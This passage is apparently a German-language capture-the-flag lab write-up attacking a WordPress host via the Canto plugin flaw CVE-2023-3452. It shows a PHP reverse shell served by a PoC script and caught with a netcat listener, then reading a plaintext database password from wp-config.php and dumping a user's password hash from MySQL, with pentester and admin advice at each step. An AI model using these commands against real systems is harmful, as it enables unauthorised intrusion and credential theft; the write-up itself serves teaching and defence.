+                 2. Kopieren einer PHP-Reverse-Shell-Payload in das PoC-Verzeichnis und Anpassen der IP/Port. (Die Anpassung der IP/Port in der Shell-Datei wurde vor diesem Schritt manuell durchgeführt.)
+             </p>
+              <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+┌──(root㉿CCat)-[~/Hackingtools/CVE-2023-3452-PoC]
+└─#  <span class="command">cp /home/ccat/Downloads/revshell.<span class="command">php</span> <span class="command">php-reverse-shell.<span class="command">php</span></span></span>
+                    </div>
+                </div>
+                 <div class="terminal">
+                    <pre></pre>
+                 </div>
+             </div>
+              <p class="analysis">
+                <strong>Analyse:</strong> Eine vorbereitete PHP-Reverse-Shell-Datei wird in das PoC-Verzeichnis kopiert, damit das Skript sie über seinen lokalen HTTP-Server dem Zielsystem zur Verfügung stellen kann. Die Shell-Datei muss zuvor manuell mit der IP und dem Port des Angreifersystems konfiguriert werden.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Das Vorbereiten der Shell-Payload ist notwendig, um nach der Code-Ausführung auf dem Zielsystem eine interaktive Verbindung zurück zum Angreifer aufzubauen.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Stelle sicher, dass die Reverse-Shell-Payload korrekt konfiguriert ist und dass dein Angreifersystem auf dem angegebenen Port lauscht.
+                <br><strong>Empfehlung (Admin):</strong> Implementiere EDR-Lösungen, die das Schreiben oder Ausführen ungewöhnlicher Skriptdateien im Webroot erkennen können.
+            </p>
+
+             <p>
+                 3. Auf dem Angreifersystem einen Netcat-Listener auf dem in der Shell-Payload konfigurierten Port starten.
+             </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+┌──(root㉿CCat)-[~/Hackingtools/CVE-2023-3452-PoC]
+└─#  <span class="command">nc -lvnp 9001</span>
+                    </div>
+                </div>
+                 <div class="terminal">
+                    <pre><span class="password">listening on [any] 9001 ...</span></pre>
+                 </div>
+             </div>
+              <p class="analysis">
+                <strong>Analyse:</strong> Der `nc` (netcat) Befehl wird im Listener-Modus (`-l`), mit ausführlicher Ausgabe (`-v`), ohne DNS-Auflösung (`-n`) und auf dem angegebenen Port (9001) gestartet. Dies wartet auf eine eingehende Verbindung von der Reverse Shell auf dem Zielsystem.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Ein Netcat-Listener ist die Standardmethode, um eine Reverse Shell zu empfangen. Das erfolgreiche Starten des Listeners ist essentiell, um die Verbindung vom Zielsystem zu erhalten.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Stelle sicher, dass keine Firewall den eingehenden Port auf deinem System blockiert.
+                <br><strong>Empfehlung (Admin):</strong> Überwache ausgehenden Netzwerkverkehr von Webservern, insbesondere Verbindungen zu ungewöhnlichen Ports oder Zielen im Internet. Implementiere Ausgangs-Firewall-Regeln.
+            </p>
+
+             <p>
+                 4. Ausführen des PoC-Skripts mit der Option, die Reverse-Shell-Datei zu verwenden.
+             </p>
+              <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+┌──(root㉿CCat)-[~/Hackingtools/CVE-2023-342-PoC]
+└─#  <span class="command">python3 CVE-2023-3452.py -u http://192.168.2.57 -LHOST 192.168.2.199 -NC_PORT 9001 -s <span class="command">php-reverse-shell.php</span></span>
+                    </div>
+                </div>
+                 <div class="terminal">
+                    <pre>
+Exploitation <span class="command">URL</span>: http://192.168.2.57/wp-content/plugins/canto/includes/lib/download.<span class="command">php</span>?<span class="command">wp_abspath</span>=http://192.168.2.199:8080&amp;<span class="command">cmd</span>=<span class="command">whoami</span>  // cmd=whoami hier dient nur als Beispiel-Placeholder im Skript-Output
+Local web server on <span class="command">PORT</span> 8080...
+192.168.2.57 - - [<span class="command">23/Jun/2025 16:17:40</span>] <span class="password">&quot;GET /wp-admin/admin.<span class="command">php</span> HTTP/1.1&quot; 200 -</span>
+</pre>
+                 </div>
+             </div>
+              <p class="analysis">
+                <strong>Analyse:</strong> Das Skript wird erneut ausgeführt, diesmal mit dem Parameter `-s php-reverse-shell.php`, der dem Skript anweist, die Reverse-Shell-Datei über den lokalen HTTP-Server bereitzustellen und den Exploit so zu triggern, dass die Shell auf dem Zielsystem ausgeführt wird. Das Skript startet wieder den lokalen Server und sendet die präparierte Anfrage an das Ziel.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die Ausführung des Skripts ist der aktive Schritt, der die Schwachstelle ausnutzt und versucht, die Reverse Shell auf dem Zielsystem zu aktivieren. Die Konsolenmeldung zeigt, dass das Ziel die Anfrage empfangen hat.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Achte auf die Ausgabe des Netcat-Listeners, um den Erfolg der Shell-Verbindung zu verifizieren.
+                <br><strong>Empfehlung (Admin):</strong> Überwache Logs des Webservers auf verdächtige Anfragen, insbesondere solche, die Datei-Inklusionsparameter oder ungewöhnliche URLs enthalten.
+            </p>
+
+             <p>
+                 5. Erfolgreiche Verbindung zum Netcat-Listener und Erhalt einer `www-data`-Shell.
+             </p>
+             <div class="code-block">
+                 <div class="terminal">
+                    <pre>
+<span class="password">connect to [192.168.2.199] from canto.hmv [192.168.2.57] 53400</span></pre>
+                 </div>
+             </div>
+             <p>
+                 <span class="password">Fantastisch! Der Initial Access war erfolgreich, nun haben wir unser Ziel erreicht und eine Shell als Benutzer `www-data` auf dem Zielsystem erhalten.</span>
+             </p>
+
+             <p class="analysis">
+                <strong>Analyse:</strong> Der Netcat-Listener auf dem Angreifersystem meldet eine eingehende Verbindung von der IP-Adresse des Zielsystems (192.168.2.57) auf dem konfigurierten Port (9001). Dies bestätigt, dass die Reverse Shell auf dem Zielsystem erfolgreich ausgeführt wurde und eine Verbindung zu meinem Listener aufgebaut hat.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Dies ist der Beweis für den erfolgreichen Initial Access. Ich habe nun interaktiven Kommandozeilenzugriff auf das Zielsystem mit den Berechtigungen des Benutzers `www-data`. Dies markiert den Abschluss der Initial Access Phase des Pentests.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Stabilisiere die Shell (z.B. mit `stty`). Beginne mit der systeminternen Aufklärung (Enumeration) als Benutzer `www-data`, um Informationen für eine mögliche Privilege Escalation zu sammeln. Prüfe Dateisystemberechtigungen, laufende Prozesse, Netzwerkverbindungen, installierte Pakete und Konfigurationsdateien, insbesondere nach Anmeldedaten oder Hinweisen auf Rechteausweitung.
+                <br><strong>Empfehlung (Admin):</strong> Die Kompromittierung des Webserver-Benutzers ist ein schwerwiegendes Problem. Untersuche die Ursache (veraltetes Plugin) und führe eine gründliche Forensik durch, um das Ausmaß der Kompromittierung festzustellen. Ändere alle auf dem System gespeicherten Anmeldedaten, insbesondere solche, die der Benutzer `www-data` möglicherweise einsehen konnte (z.B. Datenbankpasswörter in Konfigurationsdateien). Implementiere eine umfassende Sicherheitsüberwachung.
+            </p>
+
+            <p>
+                <strong>Beweismittel:</strong> Siehe die obigen Code-Blöcke, die das Klonen des PoC, das Starten des Listeners und die erfolgreiche Verbindungsaufnahme zeigen.
+            </p>
+            <p>
+                <strong>Risikobewertung:</strong> Hoch. Die Schwachstelle ermöglicht unauthentifizierte Remote Code Execution, was eine vollständige Kompromittierung des Webservers durch jeden Angreifer ohne Authentifizierung ermöglicht.
+            </p>
+            <p>
+                <strong>Empfehlungen:</strong> Aktualisiere das Canto WordPress Plugin umgehend auf die neueste, nicht anfällige Version. Überprüfe und härte die Berechtigungen des `www-data` Benutzers. Implementiere eine Ausgangs-Firewall, die ungewöhnlichen ausgehenden Datenverkehr vom Webserver blockiert. Deaktiviere die Benutzeraufzählung über die REST API und schütze `xmlrpc.php` und `wp-login.php`.
+            </p>
+        </section>
+
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation</h2>
+            <p>
+                Nachdem ich eine Shell als Benutzer `www-data` erhalten hatte, bestand der nächste Schritt darin, Informationen über das System zu sammeln, die mir helfen könnten, meine Berechtigungen zu erweitern und Root-Zugriff zu erlangen. Zuerst habe ich die Shell stabilisiert.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+www-data@canto:/$ <span class="command">stty rows 47 columns 94</span></pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Der Befehl `stty rows X columns Y` dient dazu, die Terminalgröße der aktuellen Shell anzupassen. Dies verbessert die Benutzerfreundlichkeit, indem es z.B. die Ausgabe von Befehlen korrekt formatiert und die Nutzung von Tools, die eine interaktive Shell erwarten, ermöglicht.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Ein Standard-Schritt zur Verbesserung der Nutzbarkeit einer Reverse Shell. Hat keine direkte Auswirkung auf die Sicherheit, ist aber praktisch.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Führe diesen Schritt immer am Anfang einer Reverse Shell Sitzung durch.
+                <br><strong>Empfehlung (Admin):</strong> Keine direkte Empfehlung.
+            </p>
+
+            <p>
+                Meine systeminterne Aufklärung begann im Home-Verzeichnis, um herauszufinden, welche Benutzer existieren.
+            </p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <pre>
+www-data@canto:/$ <span class="command">ls /home/</span>
+<span class="command">erik</span></pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Der Befehl `ls /home/` listet den Inhalt des `/home`-Verzeichnisses auf. Die Ausgabe zeigt ein Unterverzeichnis namens `erik`. Dies identifiziert `erik` als einen regulären Benutzer auf dem System.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die Identifizierung des Benutzers `erik` ist ein wichtiger Fund. Normale Benutzerkonten sind oft Ziele für Privilege Escalation, entweder durch Passwort-Knacken, Ausnutzung von Sudo-Berechtigungen oder das Finden sensibler Dateien in deren Home-Verzeichnis. Der Benutzername `<span class="password">erik</span>` stimmt mit dem zuvor über die WordPress REST API gefundenen Benutzernamen überein.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Konzentriere die weitere Enumeration auf das Home-Verzeichnis von `erik`. Suche nach Konfigurationsdateien (.ssh, .bash_history), Passwörtern, Notizen oder anderen Hinweisen. Versuche, dich als `erik` anzumelden, wenn du Anmeldedaten findest.
+                <br><strong>Empfehlung (Admin):</strong> Stelle sicher, dass die Berechtigungen von Home-Verzeichnissen korrekt gesetzt sind, um unbefugten Zugriff durch andere Benutzer (wie `www-data`) zu verhindern. Überprüfe, ob sensible Daten in Home-Verzeichnissen gespeichert werden.
+            </p>
+
+            <p>
+                Ich wechselte in das Home-Verzeichnis des Benutzers `erik`, um es genauer zu untersuchen.
+            </p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <pre>
+www-data@canto:/home/erik$ <span class="command">cd /home/erik/</span></pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Der Befehl `cd /home/erik/` ändert das aktuelle Arbeitsverzeichnis in das Home-Verzeichnis von `erik`. Als Benutzer `www-data` konnte ich in dieses Verzeichnis wechseln, was darauf hindeutet, dass `www-data` die notwendigen Lese- und Ausführungsberechtigungen für dieses Verzeichnis besitzt.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die Möglichkeit, in das Home-Verzeichnis eines anderen Benutzers zu wechseln, ist oft ein Zeichen für zu weite Dateisystemberechtigungen. Dies ermöglicht dem `www-data` Benutzer, potentiell sensible Dateien im Home von `erik` zu lesen.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Liste sofort den Inhalt des Verzeichnisses auf und suche nach interessanten Dateien.
+                <br><strong>Empfehlung (Admin):</strong> Überprüfe die Dateisystemberechtigungen für Benutzer-Home-Verzeichnisse. Standardmäßig sollten sie nur für den jeweiligen Benutzer (und Root) lesbar sein. Ändere die Berechtigungen für `/home/erik` so, dass `www-data` keinen Zugriff hat.
+            </p>
+
+            <p>
+                Um den Inhalt des Home-Verzeichnisses von `erik` und die Dateiberechtigungen zu sehen, listete ich alle Dateien und Verzeichnisse, einschließlich versteckter, im langen Format auf.
+            </p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <pre>
+www-data@canto:/home/erik$ <span class="command">ls -la</span>
+<span class="command">total 36</span>
+<span class="command">drwxr-xr-- 5 erik www-data 4096 May 12  2024 .</span>
+<span class="command">drwxr-xr-x 3 root root     4096 May 12  2024 ..</span>
+<span class="command">lrwxrwxrwx 1 root root        9 May 12  2024 .bash_history -&gt; /dev/null</span>
+<span class="command">-rw-r--r-- 1 erik erik      220 Jan  7  2023 .bash_logout</span>
+<span class="command">-rw-r--r-- 1 erik erik     3771 Jan  7  2023 .bashrc</span>
+<span class="command">drwx------ 2 erik erik     4096 May 12  2024 .cache</span>
+<span class="command">drwxrwxr-x 3 erik erik     4096 May 12  2024 .local</span>
+<span class="command">-rw-r--r-- 1 erik erik      807 Jan  7  2023 .profile</span>
+<span class="command">drwxrwxr-x 2 erik erik     4096 May 12  2024 notes</span>
+<span class="command">-rw-r----- 1 root erik       33 May 12  2024 user.txt</span>
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Die Ausgabe von `ls -la` zeigt die Dateien und Verzeichnisse in `/home/erik/`. Mehrere interessante Punkte fallen auf: Das Verzeichnis `.bash_history` ist ein Symlink auf `/dev/null`, was bedeutet, dass die Bash-Historie von `erik` nicht gespeichert wird (oder absichtlich gelöscht wurde). Es gibt ein Verzeichnis `notes` und eine Datei `user.txt`. Die Datei `user.txt` gehört dem Benutzer `root` und der Gruppe `erik`, und die Berechtigungen (`-rw-r-----`) erlauben Lesen für den Besitzer (`root`) und die Gruppe (`erik`), aber *nicht* für andere Benutzer wie `www-data`. Das Verzeichnis `notes` (`drwxrwxr-x`) ist für die Gruppe `erik` schreib- und ausführbar, was für `www-data` als Mitglied der Gruppe `www-data` irrelevant ist, aber es ist für "andere" les- und ausführbar (`r-x`). Dies ermöglicht `www-data` den Zugriff auf das `notes`-Verzeichnis.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Obwohl ich `user.txt` als `www-data` nicht direkt lesen kann (wegen der Berechtigungen `r-----`), ist die Datei vorhanden und der Dateiname ist vielversprechend (typisch für die Benutzer-Flag). Die Existenz des `notes`-Verzeichnisses, das für "andere" lesbar ist, ist ein starker Hinweis, dieses Verzeichnis weiter zu untersuchen, da dort möglicherweise nützliche Informationen gespeichert sind. Die gelöschte Bash-Historie ist ein kleiner Anti-Forensik-Hinweis.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Untersuche sofort das Verzeichnis `notes/`. Versuche den Inhalt von `user.txt` zu lesen, sobald du Berechtigungen als `erik` erlangt hast.
+                <br><strong>Empfehlung (Admin):</strong> Stelle sicher, dass sensible Dateien wie Flags nicht im Home-Verzeichnis von Benutzern abgelegt werden, insbesondere nicht mit Gruppenberechtigungen, die unbefugten Zugriff ermöglichen könnten (auch wenn `www-data` hier nicht in der Gruppe `erik` ist, andere Benutzer könnten es sein). Überprüfe die Berechtigungen aller Dateien im Home-Verzeichnis.
+            </p>
+
+            <p>
+                Dem Hinweis folgend, wechselte ich in das `notes`-Verzeichnis.
+            </p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <pre>
+www-data@canto:/home/erik$ <span class="command">cd notes/</span></pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Der Befehl `cd notes/` wechselt in das Unterverzeichnis `notes` im aktuellen Pfad. Der erfolgreiche Wechsel bestätigt, dass der Benutzer `www-data` die erforderlichen Berechtigungen (execute) für dieses Verzeichnis hat.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Dieser Schritt ist notwendig, um den Inhalt des `notes`-Verzeichnisses zu untersuchen, das aufgrund seiner Existenz und der lesbaren Berechtigungen vielversprechend für die Entdeckung weiterer Informationen ist.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Liste den Inhalt des Verzeichnisses auf.
+                <br><strong>Empfehlung (Admin):</strong> Stelle sicher, dass sensible Verzeichnisse im Dateisystem nur für autorisierte Benutzer lesbar sind.
+            </p>
+
+            <p>
+                Ich listete den Inhalt des `notes`-Verzeichnisses auf, um zu sehen, welche Dateien darin enthalten sind.
+            </p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <pre>
+www-data@canto:/home/erik/notes$ <span class="command">ls -la</span>
+<span class="command">total 16</span>
+<span class="command">drwxrwxr-x 2 erik erik     4096 May 12  2024 .</span>
+<span class="command">drwxr-xr-- 5 erik www-data 4096 May 12  2024 ..</span>
+<span class="command">-rw-rw-r-- 1 erik erik       68 May 12  2024 Day1.txt</span>
+<span class="command">-rw-rw-r-- 1 erik erik       71 May 12  2024 Day2.txt</span>
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Die Auflistung zeigt zwei Textdateien: `Day1.txt` und `Day2.txt`. Beide gehören dem Benutzer und der Gruppe `erik` und sind für "andere" lesbar (`r--`). Dies bedeutet, dass ich als `www-data` (der als "andere" zählt) den Inhalt dieser Dateien lesen kann.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Das Finden von Textdateien mit lesbaren Berechtigungen in einem Notizverzeichnis ist ein sehr starker Hinweis darauf, dass diese Dateien wichtige Informationen für die Privilege Escalation enthalten könnten, möglicherweise Passwörter oder andere Konfigurationen.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Lese den Inhalt beider Dateien sorgfältig.
+                <br><strong>Empfehlung (Admin):</strong> Sensibilisiere Benutzer dafür, keine sensiblen Informationen wie Passwörter in Klartextdateien zu speichern. Überprüfe regelmäßig das Dateisystem auf unsichere Berechtigungen.
+            </p>
+
+            <p>
+                Ich habe den Inhalt beider Notizdateien mit einem einzigen `cat`-Befehl ausgelesen.
+            </p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <pre>
+www-data@canto:/home/erik/notes$ <span class="command">cat Day*</span>
+<span class="command">On the first day I have updated some plugins and the website theme.</span>
+<span class="command">I almost lost the database with my user so I created a backups folder.</span>
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Der Befehl `cat Day*` liest den Inhalt aller Dateien im aktuellen Verzeichnis, deren Name mit "Day" beginnt. Die Ausgabe enthält eine Notiz des Benutzers `erik`. Der entscheidende Satz ist: "I almost lost the database with my user so I created a backups folder." (Ich hätte fast die Datenbank mit meinem Benutzer verloren, also habe ich einen Backups-Ordner erstellt.)
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Fantastisch! Diese Notiz liefert einen kritischen Hinweis auf die Existenz eines Backup-Ordners, der möglicherweise Datenbank-Backups oder andere sensible Daten enthält. Die Information, dass es fast zum Verlust der Datenbank kam, verstärkt die Wahrscheinlichkeit, dass ein Backup tatsächlich existiert und zugänglich sein könnte.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Suche im Dateisystem nach einem Verzeichnis namens "backups" oder ähnlichem, insbesondere in relevanten Pfaden wie `/var/www/`, `/var/`, `/opt/` oder im Home-Verzeichnis von `erik`. Achte auf das Berichtsdatum (Mai 2024 in der Notiz, Juni 2025 im Testverlauf) als möglichen Hinweis auf den Zeitrahmen des Backups.
+                <br><strong>Empfehlung (Admin):</strong> Betone in Sicherheitsrichtlinien, dass sensible Notizen niemals in ungeschützten Klartextdateien abgelegt werden sollten. Implementiere sichere Backup-Verfahren, die Backups verschlüsseln und an sicheren, vom Produktionssystem getrennten Orten speichern.
+            </p>
+
+            <p>
+                Ich begann meine Suche nach dem erwähnten "backups folder" in gängigen Systempfaden, wo Backups oder Webdaten oft gespeichert werden.
+            </p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <pre>
+www-data@canto:/home/erik/notes$ <span class="command">ls -la /opt/</span>
+<span class="command">total 8</span>
+<span class="command">drwxr-xr-x  2 root root 4096 Oct 11  2023 .</span>
+<span class="command">drwxr-xr-x 20 root root 4096 May 12  2024 ..</span>
+www-data@canto:/home/erik/notes$ <span class="command">ls -la /var/mail/</span>
+<span class="command">total 8</span>
+<span class="command">drwxrwsr-x  2 root mail 4096 Oct 11  2023 .</span>
+<span class="command">drwxr-xr-x 15 root root 4096 May 12  2024 ..</span>
+www-data@canto:/home/erik/notes$ <span class="command">ls -la /var/backups/</span>
+<span class="command">total 812</span>
+<span class="command">drwxr-xr-x  2 root root   4096 Jun 23 13:06 .</span>
+<span class="command">drwxr-xr-x 15 root root   4096 May 12  2024 ..</span>
+<span class="command">-rw-r--r--  1 root root  51200 Jun 23 13:01 alternatives.tar.0</span>
+<span class="command">-rw-r--r--  1 root root  41012 May 12  2024 apt.extended_states.0</span>
+<span class="command">-rw-r--r--  1 root root      0 Jun 23 13:01 dpkg.arch.0</span>
+<span class="command">-rw-r--r--  1 root root    170 May 12  2024 dpkg.diversions.0</span>
+<span class="command">-rw-r--r--  1 root root    172 May 12  2024 dpkg.statoverride.0</span>
+<span class="command">-rw-r--r--  1 root root 716513 May 12  2024 dpkg.status.0</span>
+www-data@canto:/home/erik/notes$ <span class="command">ls -la /var/www/</span>
+<span class="command">.bash_history  html/      </span>
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Ich habe verschiedene Standardverzeichnisse (`/opt`, `/var/mail`, `/var/backups`, `/var/www`) überprüft. Die Ausgaben zeigen die Inhalte dieser Verzeichnisse und ihre Berechtigungen. `/var/backups` enthält System-Backups, aber nichts Datenbank-spezifisches. `/var/www/` enthält `.bash_history` und das `html` Verzeichnis (das wahrscheinlich den Webroot enthält). Die `.bash_history` unter `/var/www/` ist sehr interessant, da sie die Shell-Befehle des Benutzers anzeigt, der zuletzt in diesem Verzeichnis aktiv war.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Das Finden der `.bash_history` unter `/var/www/` ist ein wichtiger Fund. Shell-Historien enthalten oft Befehle, die sensible Informationen preisgeben könnten, wie z.B. Dateipfade, Benutzernamen, Passwörter (wenn in Befehlen eingegeben) oder Hinweise auf andere Speicherorte. Der Backups-Hinweis aus den Notizen und die Existenz dieser History legen nahe, dass hier der Schlüssel zum Backup-Ordner liegen könnte.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Lese sofort den Inhalt der Datei `/var/www/.bash_history`. Diese Datei hat hohe Priorität, um den Speicherort oder Namen des Backup-Ordners zu finden. Untersuche auch das `html` Verzeichnis unter `/var/www/`, um die WordPress-Konfigurationsdateien zu finden.
+                <br><strong>Empfehlung (Admin):</strong> Konfiguriere Systeme so, dass sensible Verzeichnisse wie `/var/www/` keine Benutzer-Historie speichern, oder beschränke den Zugriff auf diese History-Dateien strikt.
+            </p>
+
+            <p>
+                Nach dem Fund der `.bash_history` in `/var/www/html/` habe ich ihren Inhalt ausgelesen, um weitere Hinweise zu erhalten.
+            </p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <pre>
+www-data@canto:/home/erik/notes$ <span class="command">cat /var/www/html/wp-config.<span class="command">php</span></span>
+<span class="command">define( &apos;DB_NAME&apos;, &apos;wordpress&apos; );</span>
+
+<span class="command">/** Database username */</span>
+<span class="command">define( &apos;DB_USER&apos;, &apos;wordpress&apos; );</span>
+
+<span class="command">/** Database password */</span>
+<span class="command">define( &apos;DB_PASSWORD&apos;, &apos;<span class="password">2NCVjoWVE9iwxPz</span>&apos; );</span>
+
+<span class="command">/** Database hostname */</span>
+<span class="command">define( &apos;DB_HOST&apos;, &apos;localhost&apos; );</span>
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Ich habe zuerst einen Blick in die WordPress-Konfigurationsdatei `wp-config.php` geworfen, da diese oft Datenbank-Anmeldedaten enthält. Der Befehl `cat /var/www/html/wp-config.php` liest die Datei. Die Ausgabe zeigt die Konfiguration der Datenbankverbindung, einschließlich des Datenbanknamens (`wordpress`), des Benutzers (`wordpress`) und des **Passworts** (`<span class="password">2NCVjoWVE9iwxPz</span>`).
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Das Auffinden des Datenbank-Passworts in Klartext in `wp-config.php` ist eine signifikante Schwachstelle, auch wenn diese Datei durch Webserver-Konfigurationen oft geschützt ist. Es ermöglicht mir nun, mich direkt mit der MySQL-Datenbank zu verbinden und deren Inhalt zu untersuchen, was für die Privilege Escalation nützlich sein kann (z.B. durch das Holen von Benutzer-Hashes).
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Nutze die gefundenen Datenbank-Anmeldedaten, um dich mit der MySQL-Datenbank zu verbinden und nach Benutzerinformationen (Hashes), Konfigurationen oder anderen sensiblen Daten zu suchen.
+                <br><strong>Empfehlung (Admin):</strong> Stelle sicher, dass die `wp-config.php` Datei bestmöglich geschützt ist (z.B. durch restriktive Dateisystemberechtigungen). Erwäge, das Datenbank-Passwort nicht direkt in der Datei zu speichern, falls dies durch externe Konfigurationen möglich ist. Implementiere eine separate Datenbankbenutzer mit minimalen Berechtigungen für WordPress.
+            </p>
+        </section>
+
+        <section id="privilege-escalation-part2">
+             <h2>Privilege Escalation (Fortsetzung)</h2>
+             <p>
+                 Mit den Datenbank-Anmeldedaten konnte ich mich direkt mit der MySQL-Datenbank auf dem Zielsystem verbinden, um den Inhalt zu untersuchen.
+             </p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <pre>
+www-data@canto:/home/erik/notes$ <span class="command">mysql -u wordpress -p<span class="password">2NCVjoWVE9iwxPz</span></span>
+<span class="password">mysql: [Warning] Using a password on the command line interface can be insecure.</span>
+Welcome to the MySQL monitor.  Commands end with ; or \g.
+Your MySQL connection id is <span class="command">74663</span>
+Server version: <span class="command">8.0.36-0ubuntu0.23.10.1 (Ubuntu)</span>
+
+Copyright (c) <span class="command">2000, 2024, Oracle and/or its affiliates.</span>
+
+<span class="command">Oracle is a registered trademark of Oracle Corporation and/or its</span>
+<span class="command">affiliates. Other names may be trademarks of their respective</span>
+<span class="command">owners.</span>
+
+Type &apos;help;&apos; or &apos;\h&apos; for help. Type &apos;\c&apos; to clear the current input statement.
+
+<span class="password">mysql&gt; show databases;</span>
+<span class="command">+--------------------+</span>
+<span class="command">| Database           |</span>
+<span class="command">+--------------------+</span>
+<span class="command">| information_schema |</span>
+<span class="command">| performance_schema |</span>
+<span class="password">| wordpress          |</span>
+<span class="command">+--------------------+</span>
+<span class="command">3 rows in set (0.00 sec)</span>
+
+<span class="password">mysql&gt; use wordpress;</span>
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+<span class="command">Database changed</span>
+<span class="password">mysql&gt; show tables;</span>
+<span class="command">+-----------------------+</span>
+<span class="command">| Tables_in_wordpress   |</span>
+<span class="command">+-----------------------+</span>
+<span class="command">| wp_commentmeta        |</span>
+<span class="command">| wp_comments           |</span>
+<span class="command">| wp_links              |</span>
+<span class="command">| wp_options            |</span>
+<span class="command">| wp_postmeta           |</span>
+<span class="command">| wp_posts              |</span>
+<span class="command">| wp_term_relationships |</span>
+<span class="command">| wp_term_taxonomy      |</span>
+<span class="command">| wp_termmeta           |</span>
+<span class="command">| wp_terms              |</span>
+<span class="command">| wp_usermeta           |</span>
+<span class="password">| wp_users              |</span>
+<span class="command">+-----------------------+</span>
+<span class="command">12 rows in set (0.00 sec)</span>
+
+<span class="password">mysql&gt; select * from wp_users;</span>
+<span class="command">+----+------------+------------------------------------+---------------+----------------+---------------------+---------------------+---------------------+-------------+--------------+</span>
+<span class="command">| ID | user_login | user_pass                          | user_nicename | user_email     | user_url            | user_registered     | user_activation_key | user_status | display_name |</span>
+<span class="command">+----+------------+------------------------------------+---------------+----------------+---------------------+---------------------+---------------------+-------------+--------------+</span>
+<span class="command">|  1 | erik       | $P$BZk2jE4XrC91HKgRS83h0gICjM0bcB. | erik          | test@gmail.com | http://192.168.1.36 | 2024-05-12 11:16:07 |                     |           0 | erik         |</span>
+<span class="command">+----+------------+------------------------------------+---------------+----------------+---------------------+---------------------+---------------------+-------------+--------------+</span>
+<span class="command">1 row in set (0.00 sec)</span>
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Mit dem Befehl `mysql -u wordpress -p...` konnte ich mich erfolgreich als Benutzer `wordpress` an der lokalen MySQL-Datenbank anmelden. Die Ausgabe zeigt die MySQL-Shell. Ich habe standardmäßige Datenbankbefehle verwendet (`show databases;`, `use wordpress;`, `show tables;`) um die Struktur zu erkunden und bestätigte die Existenz der `wordpress` Datenbank und der notwendigen Tabellen (wie `wp_users`). Der Befehl `select * from wp_users;` liest den Inhalt der Benutzertabelle. Die Ausgabe liefert den Benutzernamen `<span class="password">erik</span>` (bestätigt den vorherigen Fund) und seinen gehashten Passwortwert: `<span class="password">$P$BZk2jE4XrC91HKgRS83h0gICjM0bcB.</span>`. Die Warnung über die Unsicherheit der Passworteingabe über die Kommandozeile wird ebenfalls ausgegeben.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der Zugriff auf die Datenbank und das Extrahieren des gehashten Passworts für den Benutzer `<span class="password">erik</span>` ist ein signifikanter Fortschritt. Hashes können oft offline geknackt werden, um das Klartextpasswort zu erhalten. Die Tatsache, dass der Hash in der Datenbank gespeichert ist, zeigt die Notwendigkeit sicherer Passwort-Hashes.
+            </p>
+            <p class="recommendation">
